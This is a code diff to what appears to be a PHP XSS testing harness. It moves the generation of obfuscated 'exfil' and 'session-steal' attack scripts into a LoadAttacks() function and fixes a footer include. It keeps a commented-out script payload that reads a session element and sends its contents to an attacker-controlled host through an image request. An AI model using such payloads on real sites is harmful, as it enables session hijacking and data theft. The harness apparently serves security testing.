@@ -3,7 +3,6 @@ include('../declare.php');
 include(INCDIR.'payload.php');
 
 $errors = array();
-$attacks = array();
 
 function PrepareScript($testname, $obfu, $subs) {
   if (is_array($subs)) {
@@ -26,19 +25,7 @@ function PrepareImage($src) {
   return urlencode('<img src="'.$src.'" />');
 }
 
-$adesc = 'exfil_test';
-$attacks[$adesc] = array();
-foreach ($OBFUSCATIONS as $name => $obfu) {
-  $exfilsub = array('TESTNAME' => $name);
-  $attacks[$adesc][$name] = PrepareScript('exfil', $obfu, $exfilsub);
-}
-
-$adesc = 'session-steal';
-$attacks[$adesc] = array();
-foreach ($OBFUSCATIONS as $name => $obfu) {
-  $attacks[$adesc][$name] = PrepareScript('sessionsteal', $obfu, true);
-}
-
+$attacks = LoadAttacks();
 
 //$value = urlencode("<script>var d=document;var e=d.getElementById('session');var i=d.createElement('img');i.src='".MALROOT."images/attack.png?'+encodeURIComponent(e.textContent);e.appendChild(i);</script>");
 
@@ -78,5 +65,5 @@ foreach ($attacks as $aname => $attack) {
 $links = array(
   'stored XSS start' => TGTROOT."stored/start",
 );
-include(INCDIR.'inc/footer.php');
+include(INCDIR.'footer.php');
 ?>
